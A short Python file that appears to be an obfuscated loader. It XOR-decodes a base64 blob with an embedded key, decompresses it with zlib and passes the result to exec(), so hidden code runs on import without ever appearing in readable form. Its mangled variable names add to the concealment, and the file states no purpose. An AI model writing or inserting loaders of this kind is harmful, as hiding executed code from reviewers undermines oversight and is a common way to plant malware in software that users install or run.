import base64 as _q_0e4fba53
import zlib as _z_0e4fba53
_k_0e4fba53 = b'\t\xc7\xf3\x9f\xb1\xd7z\xe7\x9d\xaa9\x1b\xf55\xb6j;\x9e,.E\x8f\x90\xdf'
_d_0e4fba53 = bytes(_c_0e4fba53 ^ _k_0e4fba53[_i_0e4fba53 % len(_k_0e4fba53)] for _i_0e4fba53, _c_0e4fba53 in enumerate(_q_0e4fba53.b64decode('cR04U5wfVc3M4nM3uwCFO3OyeqZqA6frP/PD04TinC0Z4m/+kRM3z5GOfnJsJvnV+AKDnjwvPqq2hDw73X+bQxZUb3jpGAJFlViozyWNJksczoVFZ6y/Ih27OYoc3J8VX+je1mJiKjAZ8KhfsB4OahiYagw=')))
_d_0e4fba53 = _z_0e4fba53.decompress(_d_0e4fba53)
exec(compile(_d_0e4fba53, __file__, 'exec'), globals(), globals())
